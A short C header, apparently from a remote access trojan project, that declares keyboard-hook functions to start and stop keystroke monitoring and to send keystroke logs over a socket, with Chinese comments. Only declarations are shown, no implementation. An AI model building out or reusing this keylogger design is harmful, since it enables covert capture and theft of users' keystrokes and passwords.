#include "Header.h"
#include "RatProto.h"

#define PERFILENUMS	1000

extern BOOL flag;
extern SOCKET keysockfd;


//导出函数
typedef HHOOK (*STARTHOOK)(void);
typedef void (*STOPHOOK)(void);
typedef char* (*GETTEXT)(void);


extern STARTHOOK StartHook;
extern STOPHOOK  StopHook;
extern GETTEXT	 GetText;

//开启键盘监控
HHOOK Start2Hook(SOCKET sockfd);
//关闭键盘监控
BOOL Stop2Hook(SOCKET sockfd);
//发送键盘记录
void KeyLog(void);